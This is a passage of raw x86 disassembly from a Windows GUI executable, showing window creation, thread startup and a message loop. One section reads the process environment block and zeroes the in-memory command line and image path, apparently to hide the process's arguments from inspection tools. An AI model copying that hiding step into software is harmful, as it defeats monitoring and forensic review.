  401eb6:	68 ff 00 00 00       	push   $0xff
  401ebb:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  401ebf:	50                   	push   %eax
  401ec0:	68 e0 33 40 00       	push   $0x4033e0
  401ec5:	ff d6                	call   *%esi
  401ec7:	8d 44 24 68          	lea    0x68(%esp),%eax
  401ecb:	e8 60 fe ff ff       	call   0x401d30
  401ed0:	6a 06                	push   $0x6
  401ed2:	68 40 61 40 00       	push   $0x406140
  401ed7:	ff 15 54 30 40 00    	call   *0x403054
  401edd:	e8 2e f8 ff ff       	call   0x401710
  401ee2:	e9 a7 00 00 00       	jmp    0x401f8e
  401ee7:	68 6c 34 40 00       	push   $0x40346c
  401eec:	68 60 50 40 00       	push   $0x405060
  401ef1:	ff 15 30 31 40 00    	call   *0x403130
  401ef7:	85 c0                	test   %eax,%eax
  401ef9:	0f 84 8f 00 00 00    	je     0x401f8e
  401eff:	64 8b 3d 30 00 00 00 	mov    %fs:0x30,%edi
  401f06:	8b 47 10             	mov    0x10(%edi),%eax
  401f09:	c7 05 80 56 40 00 01 	movl   $0x1,0x405680
  401f10:	00 00 00 
  401f13:	66 39 58 40          	cmp    %bx,0x40(%eax)
  401f17:	74 75                	je     0x401f8e
  401f19:	8b 50 44             	mov    0x44(%eax),%edx
  401f1c:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401f20:	51                   	push   %ecx
  401f21:	52                   	push   %edx
  401f22:	ff 15 28 31 40 00    	call   *0x403128
  401f28:	83 7c 24 18 02       	cmpl   $0x2,0x18(%esp)
  401f2d:	8b f0                	mov    %eax,%esi
  401f2f:	75 5d                	jne    0x401f8e
  401f31:	8b 06                	mov    (%esi),%eax
  401f33:	50                   	push   %eax
  401f34:	ff 15 5c 30 40 00    	call   *0x40305c
  401f3a:	8b 4e 04             	mov    0x4(%esi),%ecx
  401f3d:	51                   	push   %ecx
  401f3e:	68 80 54 40 00       	push   $0x405480
  401f43:	ff 15 44 31 40 00    	call   *0x403144
  401f49:	83 c4 08             	add    $0x8,%esp
  401f4c:	e8 bf fa ff ff       	call   0x401a10
  401f51:	8b 47 10             	mov    0x10(%edi),%eax
  401f54:	0f b7 48 38          	movzwl 0x38(%eax),%ecx
  401f58:	8b 40 3c             	mov    0x3c(%eax),%eax
  401f5b:	3b cb                	cmp    %ebx,%ecx
  401f5d:	74 09                	je     0x401f68
  401f5f:	90                   	nop
  401f60:	88 18                	mov    %bl,(%eax)
  401f62:	40                   	inc    %eax
  401f63:	83 e9 01             	sub    $0x1,%ecx
  401f66:	75 f8                	jne    0x401f60
  401f68:	8b 47 10             	mov    0x10(%edi),%eax
  401f6b:	0f b7 48 40          	movzwl 0x40(%eax),%ecx
  401f6f:	8b 40 44             	mov    0x44(%eax),%eax
  401f72:	3b cb                	cmp    %ebx,%ecx
  401f74:	74 08                	je     0x401f7e
  401f76:	88 18                	mov    %bl,(%eax)
  401f78:	40                   	inc    %eax
  401f79:	83 e9 01             	sub    $0x1,%ecx
  401f7c:	75 f8                	jne    0x401f76
  401f7e:	53                   	push   %ebx
  401f7f:	53                   	push   %ebx
  401f80:	53                   	push   %ebx
  401f81:	68 a0 15 40 00       	push   $0x4015a0
  401f86:	53                   	push   %ebx
  401f87:	53                   	push   %ebx
  401f88:	ff 15 4c 30 40 00    	call   *0x40304c
  401f8e:	e8 3d fb ff ff       	call   0x401ad0
  401f93:	8b 75 08             	mov    0x8(%ebp),%esi
  401f96:	8b 3d 80 31 40 00    	mov    0x403180,%edi
  401f9c:	68 00 7f 00 00       	push   $0x7f00
  401fa1:	53                   	push   %ebx
  401fa2:	89 74 24 38          	mov    %esi,0x38(%esp)
  401fa6:	c7 44 24 4c 88 32 40 	movl   $0x403288,0x4c(%esp)
  401fad:	00 
  401fae:	c7 44 24 2c e0 1b 40 	movl   $0x401be0,0x2c(%esp)
  401fb5:	00 
  401fb6:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%esp)
  401fbd:	00 
  401fbe:	c7 44 24 24 30 00 00 	movl   $0x30,0x24(%esp)
  401fc5:	00 
  401fc6:	ff d7                	call   *%edi
  401fc8:	68 00 7f 00 00       	push   $0x7f00
  401fcd:	53                   	push   %ebx
  401fce:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  401fd2:	ff d7                	call   *%edi
  401fd4:	68 00 7f 00 00       	push   $0x7f00
  401fd9:	53                   	push   %ebx
  401fda:	89 44 24 50          	mov    %eax,0x50(%esp)
  401fde:	ff 15 40 31 40 00    	call   *0x403140
  401fe4:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  401fe8:	52                   	push   %edx
  401fe9:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  401fed:	89 5c 24 44          	mov    %ebx,0x44(%esp)
  401ff1:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  401ff5:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  401ff9:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%esp)
  402000:	00 
  402001:	ff 15 84 31 40 00    	call   *0x403184
  402007:	66 85 c0             	test   %ax,%ax
  40200a:	0f 84 64 03 00 00    	je     0x402374
  402010:	39 1d 80 56 40 00    	cmp    %ebx,0x405680
  402016:	0f 85 51 01 00 00    	jne    0x40216d
  40201c:	8b 3d 60 31 40 00    	mov    0x403160,%edi
  402022:	53                   	push   %ebx
  402023:	56                   	push   %esi
  402024:	53                   	push   %ebx
  402025:	53                   	push   %ebx
  402026:	68 4a 01 00 00       	push   $0x14a
  40202b:	68 0d 01 00 00       	push   $0x10d
  402030:	6a 01                	push   $0x1
  402032:	ff d7                	call   *%edi
  402034:	99                   	cltd
  402035:	2b c2                	sub    %edx,%eax
  402037:	d1 f8                	sar    $1,%eax
  402039:	2d 0e 01 00 00       	sub    $0x10e,%eax
  40203e:	50                   	push   %eax
  40203f:	53                   	push   %ebx
  402040:	ff d7                	call   *%edi
  402042:	99                   	cltd
  402043:	2b c2                	sub    %edx,%eax
  402045:	d1 f8                	sar    $1,%eax
  402047:	2d a0 00 00 00       	sub    $0xa0,%eax
  40204c:	50                   	push   %eax
  40204d:	68 00 00 48 00       	push   $0x480000
  402052:	68 88 32 40 00       	push   $0x403288
  402057:	68 88 32 40 00       	push   $0x403288
  40205c:	53                   	push   %ebx
  40205d:	8b 1d 68 31 40 00    	mov    0x403168,%ebx
  402063:	ff d3                	call   *%ebx
  402065:	6a 00                	push   $0x0
  402067:	8b f8                	mov    %eax,%edi
  402069:	6a fa                	push   $0xfffffffa
  40206b:	57                   	push   %edi
  40206c:	ff 15 7c 31 40 00    	call   *0x40317c
  402072:	50                   	push   %eax
  402073:	68 f5 01 00 00       	push   $0x1f5
  402078:	57                   	push   %edi
  402079:	68 d2 00 00 00       	push   $0xd2
  40207e:	68 2c 01 00 00       	push   $0x12c
  402083:	68 be 00 00 00       	push   $0xbe
  402088:	6a 00                	push   $0x0
  40208a:	68 00 00 01 50       	push   $0x50010000
  40208f:	68 00 38 40 00       	push   $0x403800
  402094:	68 0c 38 40 00       	push   $0x40380c
  402099:	6a 00                	push   $0x0
  40209b:	ff d3                	call   *%ebx
  40209d:	68 20 38 40 00       	push   $0x403820
  4020a2:	50                   	push   %eax
  4020a3:	a3 24 61 40 00       	mov    %eax,0x406124
  4020a8:	ff 15 54 31 40 00    	call   *0x403154
  4020ae:	6a 00                	push   $0x0
  4020b0:	56                   	push   %esi
  4020b1:	68 f6 01 00 00       	push   $0x1f6
  4020b6:	57                   	push   %edi
  4020b7:	6a 17                	push   $0x17
  4020b9:	68 b4 00 00 00       	push   $0xb4
  4020be:	68 e6 00 00 00       	push   $0xe6
  4020c3:	6a 28                	push   $0x28
  4020c5:	68 00 00 00 50       	push   $0x50000000
  4020ca:	68 70 38 40 00       	push   $0x403870
  4020cf:	68 74 38 40 00       	push   $0x403874
  4020d4:	68 00 02 00 00       	push   $0x200
  4020d9:	ff d3                	call   *%ebx
  4020db:	6a 00                	push   $0x0
  4020dd:	56                   	push   %esi
  4020de:	6a 00                	push   $0x0
  4020e0:	57                   	push   %edi
  4020e1:	6a 17                	push   $0x17
  4020e3:	68 b4 00 00 00       	push   $0xb4
  4020e8:	68 04 01 00 00       	push   $0x104
  4020ed:	6a 28                	push   $0x28
  4020ef:	68 01 00 01 50       	push   $0x50010001
  4020f4:	68 80 38 40 00       	push   $0x403880
  4020f9:	68 94 38 40 00       	push   $0x403894
  4020fe:	6a 00                	push   $0x0
  402100:	a3 20 61 40 00       	mov    %eax,0x406120
  402105:	ff d3                	call   *%ebx
  402107:	6a 00                	push   $0x0
  402109:	56                   	push   %esi
  40210a:	68 11 27 00 00       	push   $0x2711
  40210f:	57                   	push   %edi
  402110:	a3 54 65 40 00       	mov    %eax,0x406554
  402115:	6a 64                	push   $0x64
  402117:	6a 64                	push   $0x64
  402119:	6a 00                	push   $0x0
  40211b:	6a 00                	push   $0x0
  40211d:	68 0e 00 00 50       	push   $0x5000000e
  402122:	68 a4 38 40 00       	push   $0x4038a4
  402127:	68 bc 38 40 00       	push   $0x4038bc
  40212c:	6a 00                	push   $0x0
  40212e:	ff d3                	call   *%ebx
  402130:	6a 67                	push   $0x67
  402132:	6a 00                	push   $0x0
  402134:	a3 44 50 40 00       	mov    %eax,0x405044
  402139:	ff 15 a4 30 40 00    	call   *0x4030a4
  40213f:	50                   	push   %eax
  402140:	ff 15 6c 31 40 00    	call   *0x40316c
  402146:	50                   	push   %eax
  402147:	6a 00                	push   $0x0
  402149:	a3 58 65 40 00       	mov    %eax,0x406558
  40214e:	a1 44 50 40 00       	mov    0x405044,%eax
  402153:	68 72 01 00 00       	push   $0x172
  402158:	50                   	push   %eax
  402159:	ff 15 5c 31 40 00    	call   *0x40315c
  40215f:	6a 0a                	push   $0xa
  402161:	57                   	push   %edi
  402162:	ff 15 70 31 40 00    	call   *0x403170
  402168:	e9 b8 01 00 00       	jmp    0x402325
  40216d:	e8 3e f5 ff ff       	call   0x4016b0
  402172:	53                   	push   %ebx
  402173:	ff 15 48 31 40 00    	call   *0x403148
  402179:	8b 1d 38 30 40 00    	mov    0x403038,%ebx
  40217f:	8b f8                	mov    %eax,%edi
  402181:	6a 08                	push   $0x8
  402183:	57                   	push   %edi
  402184:	ff d3                	call   *%ebx
  402186:	6a 0a                	push   $0xa
  402188:	57                   	push   %edi
  402189:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40218d:	ff d3                	call   *%ebx
  40218f:	57                   	push   %edi
  402190:	8b d8                	mov    %eax,%ebx
  402192:	6a 00                	push   $0x0
  402194:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  402198:	ff 15 74 31 40 00    	call   *0x403174
  40219e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4021a2:	6a 00                	push   $0x0
  4021a4:	56                   	push   %esi
  4021a5:	6a 00                	push   $0x0
  4021a7:	6a 00                	push   $0x0
  4021a9:	53                   	push   %ebx
  4021aa:	51                   	push   %ecx
  4021ab:	6a 00                	push   $0x0
  4021ad:	68 00 00 00 80       	push   $0x80000000
  4021b2:	68 00 00 00 80       	push   $0x80000000
  4021b7:	68 70 38 40 00       	push   $0x403870
  4021bc:	68 88 32 40 00       	push   $0x403288
  4021c1:	6a 00                	push   $0x0
  4021c3:	ff 15 68 31 40 00    	call   *0x403168
  4021c9:	8b f8                	mov    %eax,%edi
  4021cb:	b8 56 55 55 55       	mov    $0x55555556,%eax
  4021d0:	f7 eb                	imul   %ebx
  4021d2:	8b da                	mov    %edx,%ebx
  4021d4:	c1 eb 1f             	shr    $0x1f,%ebx
  4021d7:	03 da                	add    %edx,%ebx
  4021d9:	b8 56 55 55 55       	mov    $0x55555556,%eax
  4021de:	f7 6c 24 14          	imull  0x14(%esp)
  4021e2:	8b ca                	mov    %edx,%ecx
  4021e4:	c1 e9 1f             	shr    $0x1f,%ecx
  4021e7:	03 ca                	add    %edx,%ecx
  4021e9:	b8 89 88 88 88       	mov    $0x88888889,%eax
  4021ee:	f7 6c 24 10          	imull  0x10(%esp)
  4021f2:	03 54 24 10          	add    0x10(%esp),%edx
  4021f6:	6a 00                	push   $0x0
  4021f8:	56                   	push   %esi
  4021f9:	68 f5 01 00 00       	push   $0x1f5
  4021fe:	57                   	push   %edi
  4021ff:	53                   	push   %ebx
  402200:	c1 fa 03             	sar    $0x3,%edx
  402203:	51                   	push   %ecx
  402204:	8b c2                	mov    %edx,%eax
  402206:	c1 e8 1f             	shr    $0x1f,%eax
  402209:	03 c2                	add    %edx,%eax
  40220b:	50                   	push   %eax
  40220c:	51                   	push   %ecx
  40220d:	68 00 00 01 50       	push   $0x50010000
  402212:	68 00 38 40 00       	push   $0x403800
  402217:	68 0c 38 40 00       	push   $0x40380c
  40221c:	6a 00                	push   $0x0
  40221e:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  402222:	ff 15 68 31 40 00    	call   *0x403168
  402228:	68 a0 56 40 00       	push   $0x4056a0
  40222d:	50                   	push   %eax
  40222e:	a3 24 61 40 00       	mov    %eax,0x406124
  402233:	ff 15 54 31 40 00    	call   *0x403154
  402239:	8b 44 24 10          	mov    0x10(%esp),%eax
  40223d:	6a 00                	push   $0x0
  40223f:	56                   	push   %esi
  402240:	99                   	cltd
  402241:	68 f5 01 00 00       	push   $0x1f5
  402246:	2b c2                	sub    %edx,%eax
  402248:	57                   	push   %edi
  402249:	d1 f8                	sar    $1,%eax
  40224b:	6a 10                	push   $0x10
  40224d:	83 e8 50             	sub    $0x50,%eax
  402250:	6a 46                	push   $0x46
  402252:	50                   	push   %eax
  402253:	8b 44 24 30          	mov    0x30(%esp),%eax
  402257:	99                   	cltd
  402258:	2b c2                	sub    %edx,%eax
  40225a:	d1 f8                	sar    $1,%eax
  40225c:	83 e8 23             	sub    $0x23,%eax
  40225f:	50                   	push   %eax
  402260:	68 00 00 01 50       	push   $0x50010000
  402265:	68 00 38 40 00       	push   $0x403800
  40226a:	68 0c 38 40 00       	push   $0x40380c
  40226f:	6a 00                	push   $0x0
  402271:	ff 15 68 31 40 00    	call   *0x403168
  402277:	68 cc 38 40 00       	push   $0x4038cc
  40227c:	50                   	push   %eax
  40227d:	a3 24 61 40 00       	mov    %eax,0x406124
  402282:	ff 15 54 31 40 00    	call   *0x403154
  402288:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40228c:	6a 00                	push   $0x0
  40228e:	56                   	push   %esi
  40228f:	68 f6 01 00 00       	push   $0x1f6
  402294:	57                   	push   %edi
  402295:	6a 17                	push   $0x17
  402297:	68 b4 00 00 00       	push   $0xb4
  40229c:	8d 4b 5a             	lea    0x5a(%ebx),%ecx
  40229f:	51                   	push   %ecx
  4022a0:	05 b1 00 00 00       	add    $0xb1,%eax
  4022a5:	50                   	push   %eax
  4022a6:	68 00 00 00 50       	push   $0x50000000
  4022ab:	68 70 38 40 00       	push   $0x403870
  4022b0:	68 74 38 40 00       	push   $0x403874
  4022b5:	68 00 02 00 00       	push   $0x200
  4022ba:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4022be:	ff 15 68 31 40 00    	call   *0x403168
  4022c4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4022c8:	6a 00                	push   $0x0
  4022ca:	56                   	push   %esi
  4022cb:	6a 00                	push   $0x0
  4022cd:	57                   	push   %edi
  4022ce:	6a 17                	push   $0x17
  4022d0:	68 b4 00 00 00       	push   $0xb4
  4022d5:	83 c3 78             	add    $0x78,%ebx
  4022d8:	53                   	push   %ebx
  4022d9:	52                   	push   %edx
  4022da:	68 01 00 01 50       	push   $0x50010001
  4022df:	68 e0 38 40 00       	push   $0x4038e0
  4022e4:	68 94 38 40 00       	push   $0x403894
  4022e9:	6a 00                	push   $0x0
  4022eb:	a3 20 61 40 00       	mov    %eax,0x406120
  4022f0:	ff 15 68 31 40 00    	call   *0x403168
  4022f6:	6a 03                	push   $0x3
  4022f8:	57                   	push   %edi
  4022f9:	a3 54 65 40 00       	mov    %eax,0x406554
  4022fe:	ff 15 70 31 40 00    	call   *0x403170
  402304:	57                   	push   %edi
  402305:	ff 15 58 31 40 00    	call   *0x403158
  40230b:	6a 00                	push   $0x0
  40230d:	6a 00                	push   $0x0
  40230f:	6a 00                	push   $0x0
  402311:	68 20 18 40 00       	push   $0x401820
  402316:	6a 00                	push   $0x0
  402318:	6a 00                	push   $0x0
  40231a:	ff 15 4c 30 40 00    	call   *0x40304c
  402320:	a3 84 56 40 00       	mov    %eax,0x405684
  402325:	8b 35 38 31 40 00    	mov    0x403138,%esi
  40232b:	6a 00                	push   $0x0
  40232d:	6a 00                	push   $0x0
  40232f:	6a 00                	push   $0x0
  402331:	8d 44 24 58          	lea    0x58(%esp),%eax
  402335:	50                   	push   %eax
  402336:	ff d6                	call   *%esi
  402338:	85 c0                	test   %eax,%eax
  40233a:	74 2b                	je     0x402367
  40233c:	8b 3d 88 31 40 00    	mov    0x403188,%edi
  402342:	8b 1d 4c 31 40 00    	mov    0x40314c,%ebx
  402348:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  40234c:	51                   	push   %ecx
  40234d:	ff d7                	call   *%edi
  40234f:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  402353:	52                   	push   %edx
  402354:	ff d3                	call   *%ebx
  402356:	6a 00                	push   $0x0
  402358:	6a 00                	push   $0x0
  40235a:	6a 00                	push   $0x0
  40235c:	8d 44 24 58          	lea    0x58(%esp),%eax
  402360:	50                   	push   %eax
  402361:	ff d6                	call   *%esi
  402363:	85 c0                	test   %eax,%eax
  402365:	75 e1                	jne    0x402348
  402367:	8b 44 24 54          	mov    0x54(%esp),%eax
  40236b:	5f                   	pop    %edi
  40236c:	5e                   	pop    %esi
  40236d:	5b                   	pop    %ebx
  40236e:	8b e5                	mov    %ebp,%esp
  402370:	5d                   	pop    %ebp
  402371:	c2 10 00             	ret    $0x10
  402374:	53                   	push   %ebx
  402375:	ff 15 68 30 40 00    	call   *0x403068
  40237b:	cc                   	int3
  40237c:	ff 25 90 31 40 00    	jmp    *0x403190
  402382:	ff 25 94 31 40 00    	jmp    *0x403194
  402388:	ff 25 98 31 40 00    	jmp    *0x403198
  40238e:	ff 25 ac 31 40 00    	jmp    *0x4031ac
  402394:	ff 25 a8 31 40 00    	jmp    *0x4031a8
  40239a:	ff 25 a4 31 40 00    	jmp    *0x4031a4
  4023a0:	ff 25 a0 31 40 00    	jmp    *0x4031a0
  4023a6:	ff 25 b0 31 40 00    	jmp    *0x4031b0
  4023ac:	ff 25 04 31 40 00    	jmp    *0x403104
  4023b2:	ff 25 10 31 40 00    	jmp    *0x403110
  4023b8:	ff 25 40 30 40 00    	jmp    *0x403040
